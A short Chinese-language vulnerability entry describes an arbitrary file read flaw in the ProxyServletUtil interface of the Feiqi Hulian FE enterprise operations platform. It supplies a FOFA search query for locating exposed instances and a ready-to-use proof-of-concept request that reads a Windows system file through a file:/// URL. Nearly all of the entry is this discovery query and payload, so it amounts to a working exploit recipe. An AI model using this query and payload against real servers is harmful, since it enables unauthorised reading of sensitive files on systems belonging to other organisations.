## 飞企互联-FE企业运营管理平台ProxyServletUti存在任意文件读取漏洞

飞企互联FE业务协作平台中的ProxyServletUti接口存在任意文件读取漏洞。攻击者可以通过构造特定请求，读取服务器上的敏感文件。



## fofa
```
app="飞企互联-FE企业运营管理平台"
```

## poc
```
/ProxyServletUtil?url=file:///c:/Windows/win.ini
```
